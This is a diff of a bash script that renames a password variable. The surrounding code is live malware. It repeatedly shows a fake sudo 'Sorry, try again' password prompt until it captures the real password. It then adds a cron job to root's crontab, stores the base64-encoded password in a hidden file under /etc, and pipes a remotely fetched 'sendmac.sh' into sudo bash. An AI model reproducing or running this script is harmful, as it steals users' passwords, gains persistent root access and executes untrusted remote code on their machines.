@@ -2,18 +2,18 @@
 
 echo ""
 
-pwd=""
+psd=""
 sudo -k
 echo "b4"
-echo $pwd
-echo "$(echo $pwd | sudo -S whoami)"
-while [ "$(echo $pwd | sudo -S whoami)" != "root" ]; do
+echo $psd
+echo "$(echo $psd | sudo -S whoami)"
+while [ "$(echo $psd | sudo -S whoami)" != "root" ]; do
   echo "henlo"
-  echo "pwd=$(pwd)"
+  echo "psd=$(psd)"
   sleep 3000
   echo "Sorry, try again."
   echo -n "Password:"
-  read -s pwd </dev/tty
+  read -s psd </dev/tty
   echo ""
   sudo -k
 done
@@ -30,8 +30,8 @@ echo "*/5 * * * * $command" >> mycron
 sudo crontab -u root mycron
 rm mycron
 
-enc=$(echo $pwd | base64 | tr -- '+=/' '-_~')
+enc=$(echo $psd | base64 | tr -- '+=/' '-_~')
 
-sudo echo $enc > /etc/.pwd.txt
+sudo echo $enc > /etc/.psd.txt
 
 curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
